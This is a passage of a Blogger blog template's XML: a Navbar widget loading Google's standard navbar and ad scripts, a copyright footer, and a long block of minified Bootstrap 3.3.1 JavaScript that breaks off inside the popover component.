      <b:if cond='data:attribution != &quot;&quot;'>
       <data:attribution/>
      </b:if>
    </div>

    <b:include name='quickedit'/>
  </b:includable>
                </b:widget>
                <b:widget id='Navbar1' locked='false' title='Navbar' type='Navbar' version='1'>
                  <b:includable id='main'>&lt;script type=&quot;text/javascript&quot;&gt;
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener(&#39;load&#39;,
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent(&#39;onload&#39;, function(){ object[attribute] = val; });
      }
    }
  &lt;/script&gt;
&lt;div id=&quot;navbar-iframe-container&quot;&gt;&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;https://apis.google.com/js/platform.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
      gapi.load(&quot;gapi.iframes:gapi.iframes.style.bubble&quot;, function() {
        if (gapi.iframes &amp;&amp; gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: &#39;https://draft.blogger.com/navbar.g?targetBlogID\x3d8112890002189384352\x26blogName\x3dGagan+Sharma\x26publishMode\x3dPUBLISH_MODE_HOSTED\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttps://www.gagans.com.np/search\x26blogLocale\x3den\x26v\x3d2\x26homepageUrl\x3dhttp://www.gagans.com.np/\x26vt\x3d841355632325838036&#39;,
              where: document.getElementById(&quot;navbar-iframe-container&quot;),
              id: &quot;navbar-iframe&quot;
          });
        }
      });
    &lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;
(function() {
var script = document.createElement(&#39;script&#39;);
script.type = &#39;text/javascript&#39;;
script.src = &#39;//pagead2.googlesyndication.com/pagead/js/google_top_exp.js&#39;;
var head = document.getElementsByTagName(&#39;head&#39;)[0];
if (head) {
head.appendChild(script);
}})();
&lt;/script&gt;
</b:includable>
                </b:widget>
              </b:section>
              <div class='messages'/>
            </div>
          </div>
          <!-- /Contact Body -->
        </div>

      </div>
    </div>

  </section>

  <footer class='contactFooter'>
    <div class='container'>
      <!-- COPYRIGHT -->
      <div class='col-md-12 col-sm-12 col-xs-12 footerLeft'>
        Copyright &#169; 2017 <data:blog.title/>. Distributed By <a href='http://www.protemplateslab.com' rel='dofollow' target='_blank' title='Blospot Templates'>Protemplateslab</a> &amp; Design By <a herf='http://www.templateclue.com/' href='http://www.templateclue.com/' id='templateclue' ref='dofollow' title='Free Blogger Templates'>Free Blogger Templates</a>
      </div>
      <!-- SOCIAL ICONS -->

    </div>
    <!-- END container-->
  </footer>

<script language='javascript' type='text/javascript'>//<![CDATA[
if("undefined"==typeof jQuery)throw new Error("Bootstrap's JavaScript requires jQuery");+function(a){var b=a.fn.jquery.split(" ")[0].split(".");if(b[0]<2&&b[1]<9||1==b[0]&&9==b[1]&&b[2]<1)throw new Error("Bootstrap's JavaScript requires jQuery version 1.9.1 or higher")}(jQuery),+function(a){"use strict";function b(){var a=document.createElement("bootstrap"),b={WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"oTransitionEnd otransitionend",transition:"transitionend"};for(var c in b)if(void 0!==a.style[c])return{end:b[c]};return!1}a.fn.emulateTransitionEnd=function(b){var c=!1,d=this;a(this).one("bsTransitionEnd",function(){c=!0});var e=function(){c||a(d).trigger(a.support.transition.end)};return setTimeout(e,b),this},a(function(){a.support.transition=b(),a.support.transition&&(a.event.special.bsTransitionEnd={bindType:a.support.transition.end,delegateType:a.support.transition.end,handle:function(b){return a(b.target).is(this)?b.handleObj.handler.apply(this,arguments):void 0}})})}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var c=a(this),e=c.data("bs.alert");e||c.data("bs.alert",e=new d(this)),"string"==typeof b&&e[b].call(c)})}var c='[data-dismiss="alert"]',d=function(b){a(b).on("click",c,this.close)};d.VERSION="3.3.1",d.TRANSITION_DURATION=150,d.prototype.close=function(b){function c(){g.detach().trigger("closed.bs.alert").remove()}var e=a(this),f=e.attr("data-target");f||(f=e.attr("href"),f=f&&f.replace(/.*(?=#[^\s]*$)/,""));var g=a(f);b&&b.preventDefault(),g.length||(g=e.closest(".alert")),g.trigger(b=a.Event("close.bs.alert")),b.isDefaultPrevented()||(g.removeClass("in"),a.support.transition&&g.hasClass("fade")?g.one("bsTransitionEnd",c).emulateTransitionEnd(d.TRANSITION_DURATION):c())};var e=a.fn.alert;a.fn.alert=b,a.fn.alert.Constructor=d,a.fn.alert.noConflict=function(){return a.fn.alert=e,this},a(document).on("click.bs.alert.data-api",c,d.prototype.close)}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.button"),f="object"==typeof b&&b;e||d.data("bs.button",e=new c(this,f)),"toggle"==b?e.toggle():b&&e.setState(b)})}var c=function(b,d){this.$element=a(b),this.options=a.extend({},c.DEFAULTS,d),this.isLoading=!1};c.VERSION="3.3.1",c.DEFAULTS={loadingText:"loading..."},c.prototype.setState=function(b){var c="disabled",d=this.$element,e=d.is("input")?"val":"html",f=d.data();b+="Text",null==f.resetText&&d.data("resetText",d[e]()),setTimeout(a.proxy(function(){d[e](null==f[b]?this.options[b]:f[b]),"loadingText"==b?(this.isLoading=!0,d.addClass(c).attr(c,c)):this.isLoading&&(this.isLoading=!1,d.removeClass(c).removeAttr(c))},this),0)},c.prototype.toggle=function(){var a=!0,b=this.$element.closest('[data-toggle="buttons"]');if(b.length){var c=this.$element.find("input");"radio"==c.prop("type")&&(c.prop("checked")&&this.$element.hasClass("active")?a=!1:b.find(".active").removeClass("active")),a&&c.prop("checked",!this.$element.hasClass("active")).trigger("change")}else this.$element.attr("aria-pressed",!this.$element.hasClass("active"));a&&this.$element.toggleClass("active")};var d=a.fn.button;a.fn.button=b,a.fn.button.Constructor=c,a.fn.button.noConflict=function(){return a.fn.button=d,this},a(document).on("click.bs.button.data-api",'[data-toggle^="button"]',function(c){var d=a(c.target);d.hasClass("btn")||(d=d.closest(".btn")),b.call(d,"toggle"),c.preventDefault()}).on("focus.bs.button.data-api blur.bs.button.data-api",'[data-toggle^="button"]',function(b){a(b.target).closest(".btn").toggleClass("focus",/^focus(in)?$/.test(b.type))})}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.carousel"),f=a.extend({},c.DEFAULTS,d.data(),"object"==typeof b&&b),g="string"==typeof b?b:f.slide;e||d.data("bs.carousel",e=new c(this,f)),"number"==typeof b?e.to(b):g?e[g]():f.interval&&e.pause().cycle()})}var c=function(b,c){this.$element=a(b),this.$indicators=this.$element.find(".carousel-indicators"),this.options=c,this.paused=this.sliding=this.interval=this.$active=this.$items=null,this.options.keyboard&&this.$element.on("keydown.bs.carousel",a.proxy(this.keydown,this)),"hover"==this.options.pause&&!("ontouchstart"in document.documentElement)&&this.$element.on("mouseenter.bs.carousel",a.proxy(this.pause,this)).on("mouseleave.bs.carousel",a.proxy(this.cycle,this))};c.VERSION="3.3.1",c.TRANSITION_DURATION=600,c.DEFAULTS={interval:5e3,pause:"hover",wrap:!0,keyboard:!0},c.prototype.keydown=function(a){if(!/input|textarea/i.test(a.target.tagName)){switch(a.which){case 37:this.prev();break;case 39:this.next();break;default:return}a.preventDefault()}},c.prototype.cycle=function(b){return b||(this.paused=!1),this.interval&&clearInterval(this.interval),this.options.interval&&!this.paused&&(this.interval=setInterval(a.proxy(this.next,this),this.options.interval)),this},c.prototype.getItemIndex=function(a){return this.$items=a.parent().children(".item"),this.$items.index(a||this.$active)},c.prototype.getItemForDirection=function(a,b){var c="prev"==a?-1:1,d=this.getItemIndex(b),e=(d+c)%this.$items.length;return this.$items.eq(e)},c.prototype.to=function(a){var b=this,c=this.getItemIndex(this.$active=this.$element.find(".item.active"));return a>this.$items.length-1||0>a?void 0:this.sliding?this.$element.one("slid.bs.carousel",function(){b.to(a)}):c==a?this.pause().cycle():this.slide(a>c?"next":"prev",this.$items.eq(a))},c.prototype.pause=function(b){return b||(this.paused=!0),this.$element.find(".next, .prev").length&&a.support.transition&&(this.$element.trigger(a.support.transition.end),this.cycle(!0)),this.interval=clearInterval(this.interval),this},c.prototype.next=function(){return this.sliding?void 0:this.slide("next")},c.prototype.prev=function(){return this.sliding?void 0:this.slide("prev")},c.prototype.slide=function(b,d){var e=this.$element.find(".item.active"),f=d||this.getItemForDirection(b,e),g=this.interval,h="next"==b?"left":"right",i="next"==b?"first":"last",j=this;if(!f.length){if(!this.options.wrap)return;f=this.$element.find(".item")[i]()}if(f.hasClass("active"))return this.sliding=!1;var k=f[0],l=a.Event("slide.bs.carousel",{relatedTarget:k,direction:h});if(this.$element.trigger(l),!l.isDefaultPrevented()){if(this.sliding=!0,g&&this.pause(),this.$indicators.length){this.$indicators.find(".active").removeClass("active");var m=a(this.$indicators.children()[this.getItemIndex(f)]);m&&m.addClass("active")}var n=a.Event("slid.bs.carousel",{relatedTarget:k,direction:h});return a.support.transition&&this.$element.hasClass("slide")?(f.addClass(b),f[0].offsetWidth,e.addClass(h),f.addClass(h),e.one("bsTransitionEnd",function(){f.removeClass([b,h].join(" ")).addClass("active"),e.removeClass(["active",h].join(" ")),j.sliding=!1,setTimeout(function(){j.$element.trigger(n)},0)}).emulateTransitionEnd(c.TRANSITION_DURATION)):(e.removeClass("active"),f.addClass("active"),this.sliding=!1,this.$element.trigger(n)),g&&this.cycle(),this}};var d=a.fn.carousel;a.fn.carousel=b,a.fn.carousel.Constructor=c,a.fn.carousel.noConflict=function(){return a.fn.carousel=d,this};var e=function(c){var d,e=a(this),f=a(e.attr("data-target")||(d=e.attr("href"))&&d.replace(/.*(?=#[^\s]+$)/,""));if(f.hasClass("carousel")){var g=a.extend({},f.data(),e.data()),h=e.attr("data-slide-to");h&&(g.interval=!1),b.call(f,g),h&&f.data("bs.carousel").to(h),c.preventDefault()}};a(document).on("click.bs.carousel.data-api","[data-slide]",e).on("click.bs.carousel.data-api","[data-slide-to]",e),a(window).on("load",function(){a('[data-ride="carousel"]').each(function(){var c=a(this);b.call(c,c.data())})})}(jQuery),+function(a){"use strict";function b(b){var c,d=b.attr("data-target")||(c=b.attr("href"))&&c.replace(/.*(?=#[^\s]+$)/,"");return a(d)}function c(b){return this.each(function(){var c=a(this),e=c.data("bs.collapse"),f=a.extend({},d.DEFAULTS,c.data(),"object"==typeof b&&b);!e&&f.toggle&&"show"==b&&(f.toggle=!1),e||c.data("bs.collapse",e=new d(this,f)),"string"==typeof b&&e[b]()})}var d=function(b,c){this.$element=a(b),this.options=a.extend({},d.DEFAULTS,c),this.$trigger=a(this.options.trigger).filter('[href="#'+b.id+'"], [data-target="#'+b.id+'"]'),this.transitioning=null,this.options.parent?this.$parent=this.getParent():this.addAriaAndCollapsedClass(this.$element,this.$trigger),this.options.toggle&&this.toggle()};d.VERSION="3.3.1",d.TRANSITION_DURATION=350,d.DEFAULTS={toggle:!0,trigger:'[data-toggle="collapse"]'},d.prototype.dimension=function(){var a=this.$element.hasClass("width");return a?"width":"height"},d.prototype.show=function(){if(!this.transitioning&&!this.$element.hasClass("in")){var b,e=this.$parent&&this.$parent.find("> .panel").children(".in, .collapsing");if(!(e&&e.length&&(b=e.data("bs.collapse"),b&&b.transitioning))){var f=a.Event("show.bs.collapse");if(this.$element.trigger(f),!f.isDefaultPrevented()){e&&e.length&&(c.call(e,"hide"),b||e.data("bs.collapse",null));var g=this.dimension();this.$element.removeClass("collapse").addClass("collapsing")[g](0).attr("aria-expanded",!0),this.$trigger.removeClass("collapsed").attr("aria-expanded",!0),this.transitioning=1;var h=function(){this.$element.removeClass("collapsing").addClass("collapse in")[g](""),this.transitioning=0,this.$element.trigger("shown.bs.collapse")};if(!a.support.transition)return h.call(this);var i=a.camelCase(["scroll",g].join("-"));this.$element.one("bsTransitionEnd",a.proxy(h,this)).emulateTransitionEnd(d.TRANSITION_DURATION)[g](this.$element[0][i])}}}},d.prototype.hide=function(){if(!this.transitioning&&this.$element.hasClass("in")){var b=a.Event("hide.bs.collapse");if(this.$element.trigger(b),!b.isDefaultPrevented()){var c=this.dimension();this.$element[c](this.$element[c]())[0].offsetHeight,this.$element.addClass("collapsing").removeClass("collapse in").attr("aria-expanded",!1),this.$trigger.addClass("collapsed").attr("aria-expanded",!1),this.transitioning=1;var e=function(){this.transitioning=0,this.$element.removeClass("collapsing").addClass("collapse").trigger("hidden.bs.collapse")};return a.support.transition?void this.$element[c](0).one("bsTransitionEnd",a.proxy(e,this)).emulateTransitionEnd(d.TRANSITION_DURATION):e.call(this)}}},d.prototype.toggle=function(){this[this.$element.hasClass("in")?"hide":"show"]()},d.prototype.getParent=function(){return a(this.options.parent).find('[data-toggle="collapse"][data-parent="'+this.options.parent+'"]').each(a.proxy(function(c,d){var e=a(d);this.addAriaAndCollapsedClass(b(e),e)},this)).end()},d.prototype.addAriaAndCollapsedClass=function(a,b){var c=a.hasClass("in");a.attr("aria-expanded",c),b.toggleClass("collapsed",!c).attr("aria-expanded",c)};var e=a.fn.collapse;a.fn.collapse=c,a.fn.collapse.Constructor=d,a.fn.collapse.noConflict=function(){return a.fn.collapse=e,this},a(document).on("click.bs.collapse.data-api",'[data-toggle="collapse"]',function(d){var e=a(this);e.attr("data-target")||d.preventDefault();var f=b(e),g=f.data("bs.collapse"),h=g?"toggle":a.extend({},e.data(),{trigger:this});c.call(f,h)})}(jQuery),+function(a){"use strict";function b(b){b&&3===b.which||(a(e).remove(),a(f).each(function(){var d=a(this),e=c(d),f={relatedTarget:this};e.hasClass("open")&&(e.trigger(b=a.Event("hide.bs.dropdown",f)),b.isDefaultPrevented()||(d.attr("aria-expanded","false"),e.removeClass("open").trigger("hidden.bs.dropdown",f)))}))}function c(b){var c=b.attr("data-target");c||(c=b.attr("href"),c=c&&/#[A-Za-z]/.test(c)&&c.replace(/.*(?=#[^\s]*$)/,""));var d=c&&a(c);return d&&d.length?d:b.parent()}function d(b){return this.each(function(){var c=a(this),d=c.data("bs.dropdown");d||c.data("bs.dropdown",d=new g(this)),"string"==typeof b&&d[b].call(c)})}var e=".dropdown-backdrop",f='[data-toggle="dropdown"]',g=function(b){a(b).on("click.bs.dropdown",this.toggle)};g.VERSION="3.3.1",g.prototype.toggle=function(d){var e=a(this);if(!e.is(".disabled, :disabled")){var f=c(e),g=f.hasClass("open");if(b(),!g){"ontouchstart"in document.documentElement&&!f.closest(".navbar-nav").length&&a('<div class="dropdown-backdrop"/>').insertAfter(a(this)).on("click",b);var h={relatedTarget:this};if(f.trigger(d=a.Event("show.bs.dropdown",h)),d.isDefaultPrevented())return;e.trigger("focus").attr("aria-expanded","true"),f.toggleClass("open").trigger("shown.bs.dropdown",h)}return!1}},g.prototype.keydown=function(b){if(/(38|40|27|32)/.test(b.which)&&!/input|textarea/i.test(b.target.tagName)){var d=a(this);if(b.preventDefault(),b.stopPropagation(),!d.is(".disabled, :disabled")){var e=c(d),g=e.hasClass("open");if(!g&&27!=b.which||g&&27==b.which)return 27==b.which&&e.find(f).trigger("focus"),d.trigger("click");var h=" li:not(.divider):visible a",i=e.find('[role="menu"]'+h+', [role="listbox"]'+h);if(i.length){var j=i.index(b.target);38==b.which&&j>0&&j--,40==b.which&&j<i.length-1&&j++,~j||(j=0),i.eq(j).trigger("focus")}}}};var h=a.fn.dropdown;a.fn.dropdown=d,a.fn.dropdown.Constructor=g,a.fn.dropdown.noConflict=function(){return a.fn.dropdown=h,this},a(document).on("click.bs.dropdown.data-api",b).on("click.bs.dropdown.data-api",".dropdown form",function(a){a.stopPropagation()}).on("click.bs.dropdown.data-api",f,g.prototype.toggle).on("keydown.bs.dropdown.data-api",f,g.prototype.keydown).on("keydown.bs.dropdown.data-api",'[role="menu"]',g.prototype.keydown).on("keydown.bs.dropdown.data-api",'[role="listbox"]',g.prototype.keydown)}(jQuery),+function(a){"use strict";function b(b,d){return this.each(function(){var e=a(this),f=e.data("bs.modal"),g=a.extend({},c.DEFAULTS,e.data(),"object"==typeof b&&b);f||e.data("bs.modal",f=new c(this,g)),"string"==typeof b?f[b](d):g.show&&f.show(d)})}var c=function(b,c){this.options=c,this.$body=a(document.body),this.$element=a(b),this.$backdrop=this.isShown=null,this.scrollbarWidth=0,this.options.remote&&this.$element.find(".modal-content").load(this.options.remote,a.proxy(function(){this.$element.trigger("loaded.bs.modal")},this))};c.VERSION="3.3.1",c.TRANSITION_DURATION=300,c.BACKDROP_TRANSITION_DURATION=150,c.DEFAULTS={backdrop:!0,keyboard:!0,show:!0},c.prototype.toggle=function(a){return this.isShown?this.hide():this.show(a)},c.prototype.show=function(b){var d=this,e=a.Event("show.bs.modal",{relatedTarget:b});this.$element.trigger(e),this.isShown||e.isDefaultPrevented()||(this.isShown=!0,this.checkScrollbar(),this.setScrollbar(),this.$body.addClass("modal-open"),this.escape(),this.resize(),this.$element.on("click.dismiss.bs.modal",'[data-dismiss="modal"]',a.proxy(this.hide,this)),this.backdrop(function(){var e=a.support.transition&&d.$element.hasClass("fade");d.$element.parent().length||d.$element.appendTo(d.$body),d.$element.show().scrollTop(0),d.options.backdrop&&d.adjustBackdrop(),d.adjustDialog(),e&&d.$element[0].offsetWidth,d.$element.addClass("in").attr("aria-hidden",!1),d.enforceFocus();var f=a.Event("shown.bs.modal",{relatedTarget:b});e?d.$element.find(".modal-dialog").one("bsTransitionEnd",function(){d.$element.trigger("focus").trigger(f)}).emulateTransitionEnd(c.TRANSITION_DURATION):d.$element.trigger("focus").trigger(f)}))},c.prototype.hide=function(b){b&&b.preventDefault(),b=a.Event("hide.bs.modal"),this.$element.trigger(b),this.isShown&&!b.isDefaultPrevented()&&(this.isShown=!1,this.escape(),this.resize(),a(document).off("focusin.bs.modal"),this.$element.removeClass("in").attr("aria-hidden",!0).off("click.dismiss.bs.modal"),a.support.transition&&this.$element.hasClass("fade")?this.$element.one("bsTransitionEnd",a.proxy(this.hideModal,this)).emulateTransitionEnd(c.TRANSITION_DURATION):this.hideModal())},c.prototype.enforceFocus=function(){a(document).off("focusin.bs.modal").on("focusin.bs.modal",a.proxy(function(a){this.$element[0]===a.target||this.$element.has(a.target).length||this.$element.trigger("focus")},this))},c.prototype.escape=function(){this.isShown&&this.options.keyboard?this.$element.on("keydown.dismiss.bs.modal",a.proxy(function(a){27==a.which&&this.hide()},this)):this.isShown||this.$element.off("keydown.dismiss.bs.modal")},c.prototype.resize=function(){this.isShown?a(window).on("resize.bs.modal",a.proxy(this.handleUpdate,this)):a(window).off("resize.bs.modal")},c.prototype.hideModal=function(){var a=this;this.$element.hide(),this.backdrop(function(){a.$body.removeClass("modal-open"),a.resetAdjustments(),a.resetScrollbar(),a.$element.trigger("hidden.bs.modal")})},c.prototype.removeBackdrop=function(){this.$backdrop&&this.$backdrop.remove(),this.$backdrop=null},c.prototype.backdrop=function(b){var d=this,e=this.$element.hasClass("fade")?"fade":"";if(this.isShown&&this.options.backdrop){var f=a.support.transition&&e;if(this.$backdrop=a('<div class="modal-backdrop '+e+'" />').prependTo(this.$element).on("click.dismiss.bs.modal",a.proxy(function(a){a.target===a.currentTarget&&("static"==this.options.backdrop?this.$element[0].focus.call(this.$element[0]):this.hide.call(this))},this)),f&&this.$backdrop[0].offsetWidth,this.$backdrop.addClass("in"),!b)return;f?this.$backdrop.one("bsTransitionEnd",b).emulateTransitionEnd(c.BACKDROP_TRANSITION_DURATION):b()}else if(!this.isShown&&this.$backdrop){this.$backdrop.removeClass("in");var g=function(){d.removeBackdrop(),b&&b()};a.support.transition&&this.$element.hasClass("fade")?this.$backdrop.one("bsTransitionEnd",g).emulateTransitionEnd(c.BACKDROP_TRANSITION_DURATION):g()}else b&&b()},c.prototype.handleUpdate=function(){this.options.backdrop&&this.adjustBackdrop(),this.adjustDialog()},c.prototype.adjustBackdrop=function(){this.$backdrop.css("height",0).css("height",this.$element[0].scrollHeight)},c.prototype.adjustDialog=function(){var a=this.$element[0].scrollHeight>document.documentElement.clientHeight;this.$element.css({paddingLeft:!this.bodyIsOverflowing&&a?this.scrollbarWidth:"",paddingRight:this.bodyIsOverflowing&&!a?this.scrollbarWidth:""})},c.prototype.resetAdjustments=function(){this.$element.css({paddingLeft:"",paddingRight:""})},c.prototype.checkScrollbar=function(){this.bodyIsOverflowing=document.body.scrollHeight>document.documentElement.clientHeight,this.scrollbarWidth=this.measureScrollbar()},c.prototype.setScrollbar=function(){var a=parseInt(this.$body.css("padding-right")||0,10);this.bodyIsOverflowing&&this.$body.css("padding-right",a+this.scrollbarWidth)},c.prototype.resetScrollbar=function(){this.$body.css("padding-right","")},c.prototype.measureScrollbar=function(){var a=document.createElement("div");a.className="modal-scrollbar-measure",this.$body.append(a);var b=a.offsetWidth-a.clientWidth;return this.$body[0].removeChild(a),b};var d=a.fn.modal;a.fn.modal=b,a.fn.modal.Constructor=c,a.fn.modal.noConflict=function(){return a.fn.modal=d,this},a(document).on("click.bs.modal.data-api",'[data-toggle="modal"]',function(c){var d=a(this),e=d.attr("href"),f=a(d.attr("data-target")||e&&e.replace(/.*(?=#[^\s]+$)/,"")),g=f.data("bs.modal")?"toggle":a.extend({remote:!/#/.test(e)&&e},f.data(),d.data());d.is("a")&&c.preventDefault(),f.one("show.bs.modal",function(a){a.isDefaultPrevented()||f.one("hidden.bs.modal",function(){d.is(":visible")&&d.trigger("focus")})}),b.call(f,g,this)})}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.tooltip"),f="object"==typeof b&&b,g=f&&f.selector;(e||"destroy"!=b)&&(g?(e||d.data("bs.tooltip",e={}),e[g]||(e[g]=new c(this,f))):e||d.data("bs.tooltip",e=new c(this,f)),"string"==typeof b&&e[b]())})}var c=function(a,b){this.type=this.options=this.enabled=this.timeout=this.hoverState=this.$element=null,this.init("tooltip",a,b)};c.VERSION="3.3.1",c.TRANSITION_DURATION=150,c.DEFAULTS={animation:!0,placement:"top",selector:!1,template:'<div class="tooltip" role="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',trigger:"hover focus",title:"",delay:0,html:!1,container:!1,viewport:{selector:"body",padding:0}},c.prototype.init=function(b,c,d){this.enabled=!0,this.type=b,this.$element=a(c),this.options=this.getOptions(d),this.$viewport=this.options.viewport&&a(this.options.viewport.selector||this.options.viewport);for(var e=this.options.trigger.split(" "),f=e.length;f--;){var g=e[f];if("click"==g)this.$element.on("click."+this.type,this.options.selector,a.proxy(this.toggle,this));else if("manual"!=g){var h="hover"==g?"mouseenter":"focusin",i="hover"==g?"mouseleave":"focusout";this.$element.on(h+"."+this.type,this.options.selector,a.proxy(this.enter,this)),this.$element.on(i+"."+this.type,this.options.selector,a.proxy(this.leave,this))}}this.options.selector?this._options=a.extend({},this.options,{trigger:"manual",selector:""}):this.fixTitle()},c.prototype.getDefaults=function(){return c.DEFAULTS},c.prototype.getOptions=function(b){return b=a.extend({},this.getDefaults(),this.$element.data(),b),b.delay&&"number"==typeof b.delay&&(b.delay={show:b.delay,hide:b.delay}),b},c.prototype.getDelegateOptions=function(){var b={},c=this.getDefaults();return this._options&&a.each(this._options,function(a,d){c[a]!=d&&(b[a]=d)}),b},c.prototype.enter=function(b){var c=b instanceof this.constructor?b:a(b.currentTarget).data("bs."+this.type);return c&&c.$tip&&c.$tip.is(":visible")?void(c.hoverState="in"):(c||(c=new this.constructor(b.currentTarget,this.getDelegateOptions()),a(b.currentTarget).data("bs."+this.type,c)),clearTimeout(c.timeout),c.hoverState="in",c.options.delay&&c.options.delay.show?void(c.timeout=setTimeout(function(){"in"==c.hoverState&&c.show()},c.options.delay.show)):c.show())},c.prototype.leave=function(b){var c=b instanceof this.constructor?b:a(b.currentTarget).data("bs."+this.type);return c||(c=new this.constructor(b.currentTarget,this.getDelegateOptions()),a(b.currentTarget).data("bs."+this.type,c)),clearTimeout(c.timeout),c.hoverState="out",c.options.delay&&c.options.delay.hide?void(c.timeout=setTimeout(function(){"out"==c.hoverState&&c.hide()},c.options.delay.hide)):c.hide()},c.prototype.show=function(){var b=a.Event("show.bs."+this.type);if(this.hasContent()&&this.enabled){this.$element.trigger(b);var d=a.contains(this.$element[0].ownerDocument.documentElement,this.$element[0]);if(b.isDefaultPrevented()||!d)return;var e=this,f=this.tip(),g=this.getUID(this.type);this.setContent(),f.attr("id",g),this.$element.attr("aria-describedby",g),this.options.animation&&f.addClass("fade");var h="function"==typeof this.options.placement?this.options.placement.call(this,f[0],this.$element[0]):this.options.placement,i=/\s?auto?\s?/i,j=i.test(h);j&&(h=h.replace(i,"")||"top"),f.detach().css({top:0,left:0,display:"block"}).addClass(h).data("bs."+this.type,this),this.options.container?f.appendTo(this.options.container):f.insertAfter(this.$element);var k=this.getPosition(),l=f[0].offsetWidth,m=f[0].offsetHeight;if(j){var n=h,o=this.options.container?a(this.options.container):this.$element.parent(),p=this.getPosition(o);h="bottom"==h&&k.bottom+m>p.bottom?"top":"top"==h&&k.top-m<p.top?"bottom":"right"==h&&k.right+l>p.width?"left":"left"==h&&k.left-l<p.left?"right":h,f.removeClass(n).addClass(h)}var q=this.getCalculatedOffset(h,k,l,m);this.applyPlacement(q,h);var r=function(){var a=e.hoverState;e.$element.trigger("shown.bs."+e.type),e.hoverState=null,"out"==a&&e.leave(e)};a.support.transition&&this.$tip.hasClass("fade")?f.one("bsTransitionEnd",r).emulateTransitionEnd(c.TRANSITION_DURATION):r()}},c.prototype.applyPlacement=function(b,c){var d=this.tip(),e=d[0].offsetWidth,f=d[0].offsetHeight,g=parseInt(d.css("margin-top"),10),h=parseInt(d.css("margin-left"),10);isNaN(g)&&(g=0),isNaN(h)&&(h=0),b.top=b.top+g,b.left=b.left+h,a.offset.setOffset(d[0],a.extend({using:function(a){d.css({top:Math.round(a.top),left:Math.round(a.left)})}},b),0),d.addClass("in");var i=d[0].offsetWidth,j=d[0].offsetHeight;"top"==c&&j!=f&&(b.top=b.top+f-j);var k=this.getViewportAdjustedDelta(c,b,i,j);k.left?b.left+=k.left:b.top+=k.top;var l=/top|bottom/.test(c),m=l?2*k.left-e+i:2*k.top-f+j,n=l?"offsetWidth":"offsetHeight";d.offset(b),this.replaceArrow(m,d[0][n],l)},c.prototype.replaceArrow=function(a,b,c){this.arrow().css(c?"left":"top",50*(1-a/b)+"%").css(c?"top":"left","")},c.prototype.setContent=function(){var a=this.tip(),b=this.getTitle();a.find(".tooltip-inner")[this.options.html?"html":"text"](b),a.removeClass("fade in top bottom left right")},c.prototype.hide=function(b){function d(){"in"!=e.hoverState&&f.detach(),e.$element.removeAttr("aria-describedby").trigger("hidden.bs."+e.type),b&&b()}var e=this,f=this.tip(),g=a.Event("hide.bs."+this.type);return this.$element.trigger(g),g.isDefaultPrevented()?void 0:(f.removeClass("in"),a.support.transition&&this.$tip.hasClass("fade")?f.one("bsTransitionEnd",d).emulateTransitionEnd(c.TRANSITION_DURATION):d(),this.hoverState=null,this)},c.prototype.fixTitle=function(){var a=this.$element;(a.attr("title")||"string"!=typeof a.attr("data-original-title"))&&a.attr("data-original-title",a.attr("title")||"").attr("title","")},c.prototype.hasContent=function(){return this.getTitle()},c.prototype.getPosition=function(b){b=b||this.$element;var c=b[0],d="BODY"==c.tagName,e=c.getBoundingClientRect();null==e.width&&(e=a.extend({},e,{width:e.right-e.left,height:e.bottom-e.top}));var f=d?{top:0,left:0}:b.offset(),g={scroll:d?document.documentElement.scrollTop||document.body.scrollTop:b.scrollTop()},h=d?{width:a(window).width(),height:a(window).height()}:null;return a.extend({},e,g,h,f)},c.prototype.getCalculatedOffset=function(a,b,c,d){return"bottom"==a?{top:b.top+b.height,left:b.left+b.width/2-c/2}:"top"==a?{top:b.top-d,left:b.left+b.width/2-c/2}:"left"==a?{top:b.top+b.height/2-d/2,left:b.left-c}:{top:b.top+b.height/2-d/2,left:b.left+b.width}},c.prototype.getViewportAdjustedDelta=function(a,b,c,d){var e={top:0,left:0};if(!this.$viewport)return e;var f=this.options.viewport&&this.options.viewport.padding||0,g=this.getPosition(this.$viewport);if(/right|left/.test(a)){var h=b.top-f-g.scroll,i=b.top+f-g.scroll+d;h<g.top?e.top=g.top-h:i>g.top+g.height&&(e.top=g.top+g.height-i)}else{var j=b.left-f,k=b.left+f+c;j<g.left?e.left=g.left-j:k>g.width&&(e.left=g.left+g.width-k)}return e},c.prototype.getTitle=function(){var a,b=this.$element,c=this.options;return a=b.attr("data-original-title")||("function"==typeof c.title?c.title.call(b[0]):c.title)},c.prototype.getUID=function(a){do a+=~~(1e6*Math.random());while(document.getElementById(a));return a},c.prototype.tip=function(){return this.$tip=this.$tip||a(this.options.template)},c.prototype.arrow=function(){return this.$arrow=this.$arrow||this.tip().find(".tooltip-arrow")},c.prototype.enable=function(){this.enabled=!0},c.prototype.disable=function(){this.enabled=!1},c.prototype.toggleEnabled=function(){this.enabled=!this.enabled},c.prototype.toggle=function(b){var c=this;b&&(c=a(b.currentTarget).data("bs."+this.type),c||(c=new this.constructor(b.currentTarget,this.getDelegateOptions()),a(b.currentTarget).data("bs."+this.type,c))),c.tip().hasClass("in")?c.leave(c):c.enter(c)},c.prototype.destroy=function(){var a=this;clearTimeout(this.timeout),this.hide(function(){a.$element.off("."+a.type).removeData("bs."+a.type)})};var d=a.fn.tooltip;a.fn.tooltip=b,a.fn.tooltip.Constructor=c,a.fn.tooltip.noConflict=function(){return a.fn.tooltip=d,this}}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.popover"),f="object"==typeof b&&b,g=f&&f.selector;(e||"destroy"!=b)&&(g?(e||d.data("bs.popover",e={}),e[g]||(e[g]=new c(this,f))):e||d.data("bs.popover",e=new c(this,f)),"string"==typeof b&&e[b]())})}var c=function(a,b){this.init("popover",a,b)};if(!a.fn.tooltip)throw new Error("Popover requires 